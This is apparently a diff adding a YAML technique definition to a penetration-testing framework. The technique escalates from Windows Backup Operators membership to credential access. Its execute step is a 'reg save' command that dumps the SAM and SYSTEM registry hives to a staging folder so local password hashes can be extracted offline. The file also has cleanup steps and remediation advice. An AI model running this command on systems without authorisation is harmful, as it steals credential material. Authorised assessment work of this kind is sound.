@@ -1,0 +1,34 @@
+# Backup Operators group → dump the SAM / SYSTEM hives
+#
+# Members of the Backup Operators group implicitly hold SeBackupPrivilege
+# when logged in — same route as SeBackupPrivilege, different fact source
+# (group membership vs held privilege). Shares vector_type `sebackup` so
+# a host with BOTH the priv AND the group gets one vector, not two.
+technique: T1003.002
+name: Backup Operators → dump the SAM/SYSTEM hives
+tactic: [credential-access, privilege-escalation]
+platform: [windows]
+ranking:
+  exploitability: high
+  safety: config-change
+  detection: moderate
+detect:
+  group_member: Backup Operators
+execute:
+  command: |-
+    reg save HKLM\SAM {{stage}}\sam & reg save HKLM\SYSTEM {{stage}}\sys
+verify:
+  success: "operation completed successfully"
+cleanup:
+  command: |-
+    del {{stage}}\sam {{stage}}\sys
+report:
+  vector_type: sebackup     # same key as SeBackupPrivilege → dedup
+  description: >
+    The Backup Operators group grants SeBackupPrivilege in practice.
+    Members can read any file regardless of DACL, so `reg save` on the
+    SAM/SYSTEM hives yields local hashes offline.
+  remediation: >
+    Prune Backup Operators to a purpose-built tier-0 service account.
+    Audit `reg save` operations against HKLM\SAM.
+  refs: [T1003.002, T1078.003]
